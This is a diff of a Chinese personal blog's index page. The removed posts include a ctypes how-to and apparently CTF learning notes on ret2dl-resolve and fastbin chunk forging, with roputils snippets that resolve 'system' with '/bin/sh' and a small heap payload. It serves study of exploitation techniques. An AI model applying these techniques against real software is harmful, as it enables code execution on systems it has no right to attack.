-<figure class="highlight plain"><figcaption><span>ctypes import *```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">https://docs.python.org/3.6/library/ctypes.html#structures-and-unions</span><br><span class="line"></span><br><span class="line">这是官方文档</span><br><span class="line"></span><br><span class="line">简单的用法大约是：</span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line">so = cdll.LoadLibrary</span><br><span class="line">dll = so(&quot;./libpymazing.so&quot;)</span><br><span class="line"></span><br><span class="line">dll.seta.restype = POINTER(StructPointer)</span><br><span class="line"></span><br><span class="line">cjia = dll.seta(c)</span><br></pre></td></tr></table></figure>
-<p>最需要注意的一点是：</p>
-<p>变量！</p>
-<p>其一，创建：</p>
-<p>c = c_char * 30 相当于创建char c[30],int,float都可以这么来</p>
-<p>c = (c_char_p*)(*a) 相当于创建 char **a;如果a是list，这一步操作可以转换成指针然后就能进行下一步的操作。当然这是二维list转二维指针，还有一维list转以为指针。需要注意的是，没有int这种类型的指针！我可去他妈的，烦的一批，还得再令行转换</p>
-<p>其二，返回：</p>
-<p>如果返回的是一个int数，char 字符，好说，直接返回即可，可是如果想要返回数组？抱歉，不提供直接服务。</p>
-<p>具体的操作是这么来的：</p>
-<p>C++ 端</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">StructPointerTest</span>  </span></span><br><span class="line"><span class="class">   &#123;</span>  </span><br><span class="line">    <span class="keyword">char</span> dicr[<span class="number">30</span>];</span><br><span class="line">    <span class="keyword">int</span> realsize;  </span><br><span class="line">   </span><br><span class="line">   &#125;StructPointerTest, *StructPointer;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">StructPointer <span class="title">seta</span><span class="params">(<span class="keyword">char</span> **num)</span></span>&#123;</span><br><span class="line"> StructPointer p(StructPointer)malloc(sizeof(StructPointerTest));</span><br><span class="line"> ·····</span><br><span class="line">  <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>python端的操作是这个样子，也就是创建一个结构体：</p>
-<p>class StructPointer(Structure):<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">_fields_ = [(<span class="string">"dir"</span>, c_char * <span class="number">30</span>),</span><br><span class="line">            (<span class="string">"size"</span>, c_int)]</span><br></pre></td></tr></table></figure></p>
-<p>就这样子了~，不过奇怪的是我写的这个exp有时候什么问题都没有，有时候就会出现一些内存访问的问题，好像指针的返回哪里有点毛病emmmm</p>
-<p>等以后找到原因了再来写一波，现在就这样了，睡觉哈哈哈哈</p>
-<p>项目地址：<a href="https://github.com/ppcrab/-.git" target="_blank" rel="noopener">https://github.com/ppcrab/-.git</a></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://ppcrab.github.io/2019/04/25/return-to-dl-resolve-菜鸡初学习/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/photo/hello.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/04/25/return-to-dl-resolve-菜鸡初学习/" itemprop="url">return to dl-resolve--菜鸡初学习</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-04-25T11:35:10+08:00">
-                2019-04-25
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Words count in article&#58;</span>
-                
-                <span title="Words count in article">
-                  818
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Reading time &asymp;</span>
-                
-                <span title="Reading time">
-                  3
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>身为一个小菜鸡，今年的国赛打的很是难受，第一天的题目难度我差不多能做出来。但是很可惜的是，我那天刚好赶火车，还有其他事情。太惨了，只搞了一道题目，结果第二天的题目难度感觉好难啊。</p>
-<p>第二天放出来的第一道pwn题目是babypwn，看到这个名字我就是知道肯定不是好鸟。然后开始审题目，以为很简单的一个栈溢出，结果找不到write函数写。shellcode也无法执行，rop链由于没有int 80h中断也别想了。所以，没什么思路。</p>
-<p>结果房建师傅做出来后和我说是去年0ctf的原题。。。好吧，去看看了，学习了一波ret2dl-resolve。</p>
-<p>查阅了一些资料知道了，这种利用方式有简单的也有麻烦的，这里只介绍简单的，因为我就会简单的emmm</p>
-<p>所谓的简单的方法就是利用别人已经写好的一些函数达到我们的目的，也就是</p>
-<p><a href="https://github.com/ppcrab/ret2dl-resolve-.git" target="_blank" rel="noopener">https://github.com/ppcrab/ret2dl-resolve-.git</a></p>
-<p>下面是最简单的入门级别的利用：</p>
-<p>使用这个库的第一步是rop = roputils.ROP(‘./pwn’)</p>
-<p>首先我们栈溢出到bss段的首地址，bss的首地址为0x804a040，那就进行这个地方的任意写。(话说，如果能做到任意地址写，直接使用这个思路岂不是就ok了)</p>
-<p>如果程序开启了ple，就使用这个roputils库自带的函数rop.section(‘.bss’)。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">buf2 =  rop.string(<span class="string">'/bin/sh'</span>)</span><br><span class="line">buf2 += rop.fill(<span class="number">20</span>, buf2)</span><br><span class="line">buf2 += rop.dl_resolve_data(addr_bss + <span class="number">20</span>, <span class="string">'system'</span>)</span><br><span class="line">buf2 += rop.fill(<span class="number">100</span>, buf2)</span><br></pre></td></tr></table></figure>
-<p>这些代码干了些什么都比较明了，只有第三行需要解释以下</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dl_resolve_data</span><span class="params">(self, base, name)</span>:</span></span><br><span class="line">        jmprel = self.dynamic(<span class="string">'JMPREL'</span>)</span><br><span class="line">        relent = self.dynamic(<span class="string">'RELENT'</span>)</span><br><span class="line">        symtab = self.dynamic(<span class="string">'SYMTAB'</span>)</span><br><span class="line">        syment = self.dynamic(<span class="string">'SYMENT'</span>)</span><br><span class="line">        strtab = self.dynamic(<span class="string">'STRTAB'</span>)</span><br><span class="line"></span><br><span class="line">        addr_reloc, padlen_reloc = self.align(base, jmprel, relent)</span><br><span class="line">        addr_sym, padlen_sym = self.align(addr_reloc+relent, symtab, syment)</span><br><span class="line">        addr_symstr = addr_sym + syment</span><br><span class="line"></span><br><span class="line">        r_info = (((addr_sym - symtab) / syment) &lt;&lt; <span class="number">8</span>) | <span class="number">0x7</span></span><br><span class="line">        st_name = addr_symstr - strtab</span><br><span class="line"></span><br><span class="line">        buf = self.fill(padlen_reloc)</span><br><span class="line">        buf += struct.pack(<span class="string">'&lt;II'</span>, base, r_info)                      <span class="comment"># Elf32_Rel</span></span><br><span class="line">        buf += self.fill(padlen_sym)</span><br><span class="line">        buf += struct.pack(<span class="string">'&lt;IIII'</span>, st_name, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x12</span>)             <span class="comment"># Elf32_Sym</span></span><br><span class="line">        buf += self.string(name)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> buf</span><br></pre></td></tr></table></figure>
-<p>从<code>base</code>开始便是用户可控的区域，也是用来构造伪<code>Elf32_Rel</code>, 伪<code>Elf32_Sym</code>，和符号名称的地方。具体的存放地址，还是根据数组条目的大小进行了对齐。而需要检查的地方，则全部硬编码了，只需计算这些伪条目对应在数组中的index填充即可。</p>
-<p>这一次操作的目的可以看作是伪造，就像是伪造chunk块一样。都是为了下一步的攻击做准备</p>
-<p>而具体的攻击就落实到了</p>
-<p>buf3 = ‘A’ * 0x2c + rop.dl_resolve_call(addr_bss + 20, addr_bss)</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dl_resolve_call</span><span class="params">(self, base, *args)</span>:</span></span><br><span class="line">    jmprel = self.dynamic(<span class="string">'JMPREL'</span>)</span><br><span class="line">    relent = self.dynamic(<span class="string">'RELENT'</span>)</span><br><span class="line"></span><br><span class="line">    addr_reloc, padlen_reloc = self.align(base, jmprel, relent)</span><br><span class="line">    reloc_offset = addr_reloc - jmprel</span><br><span class="line"></span><br><span class="line">    buf = self.p(self.plt())</span><br><span class="line">    buf += self.p(reloc_offset)</span><br><span class="line">    buf += self.p(self.gadget(<span class="string">'pop'</span>, n=len(args)))</span><br><span class="line">    buf += self.p(args)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> buf</span><br></pre></td></tr></table></figure>
-<p>可以看到，这里将所调用的函数的参数及返回的gadget放在栈上，再往上便是构造的伪<code>Elf32_Rel</code>条目的offset，最后则是<code>.plt</code>起始处的地址，在那里会完成将<code>link_map</code>放至栈上及调用<code>_dl_runtime_resolve</code>。</p>
-<p>一个对于这个知识点介绍的十分详细的博客，也是我主要参考的博客</p>
-<p><a href="https://rk700.github.io/2015/08/09/return-to-dl-resolve/?tdsourcetag=s_pctim_aiomsg" target="_blank" rel="noopener">https://rk700.github.io/2015/08/09/return-to-dl-resolve/?tdsourcetag=s_pctim_aiomsg</a></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://ppcrab.github.io/2019/04/24/堆pwn2-chunk块的伪造/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/photo/hello.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/04/24/堆pwn2-chunk块的伪造/" itemprop="url">chunk块的伪造</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-04-24T18:32:43+08:00">
-                2019-04-24
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Words count in article&#58;</span>
-                
-                <span title="Words count in article">
-                  636
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Reading time &asymp;</span>
-                
-                <span title="Reading time">
-                  2
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>chunk块的伪造在进行堆的利用，尤其是fastbin的利用的时候是一个十分重要的步骤，因为我们需要利用我们伪造的chunk块进行欺骗。从而达到任意地址写的目的。</p>
-<p>这一次的chunk块伪造的主要点在于fastbin利用的时候。</p>
-<h3 id="情形一，堆溢出"><a href="#情形一，堆溢出" class="headerlink" title="情形一，堆溢出"></a>情形一，堆溢出</h3><p>如果是堆溢出的情况，我们能做的就是覆盖下一个chunk块的fd，这时候的前提是：</p>
-<p>1，被覆盖的chunk处于fastbin中 ，否则就没有fd</p>
-<p>2，被覆盖的chunk块应该是最后一个进入fastbin中的，要不然轮到这个fd起作用就得等一阵子，比较麻烦，不是不可以。</p>
-<p>然后我们申请一个同样大小的malloc，就会得到这个chunk块，这时候fd就起作用了。会作用到我们下一次申请的时候malloc返回的地址。也就是达到了任意地址写的目的</p>
-<p>那么chunk块的伪造呢？这时候我们在目的地址出应该让目的地址+8的位置为size，也就是我们所利用的这个fastbin链的大小。</p>
-<p>常常。。题目中可能会出现一些记录总的malloc地址个数的东西，这时候我们就能用了。</p>
-<h3 id="任意地址free"><a href="#任意地址free" class="headerlink" title="任意地址free"></a>任意地址free</h3><p>这种时候我们要做的事情就比较多了一点，比起来上面的堆溢出，我们需要认为的构造出一个堆溢出的环境出来。也就是初始的chunk的伪造。</p>
-<p>我们可以在正常申请的堆中输入以下数据</p>
-<p><code>p64(0)+p64(0)+p64(0)+p64(size)</code></p>
-<p>然后呢，如果本来free的地址是addr,也就是我们正常申请的地方的地址。由于存在任意地址free的漏洞，我们可以把它改成free，addr+0x10的地址，这时候我们就能把一个伪造的chunk块放入fastbin块中了。然后，我们再次申请这个大小的堆，就会得到地址为addr+0x20的堆，so，我们进行edit第一个堆数据时候就能做到堆溢出，搞到第二个堆块了。然后就是和堆溢出一样了。</p>
-<p>顺便一提的是，第二次伪造chunk块的时候除了上文提到的利用记录chunk块的数量，还可以利用记录chunk块本身大小size的地址进行伪造。</p>
-<p>任意地址free的前提就是知道堆的首地址，也就是堆地址的泄露，由于写过，此处不再重复。</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
   <nav class="pagination">
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right"></i></a>
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right"></i></a>
   </nav>
 
 
@@ -2142,7 +2108,7 @@ void DFS(int v)//邻接矩阵的dfs
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">28</span>
+                  <span class="site-state-item-count">32</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -2223,7 +2189,7 @@ void DFS(int v)//邻接矩阵的dfs
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">17.7k</span>
+    <span title="Site words total count">18.7k</span>
   
 </div>
 
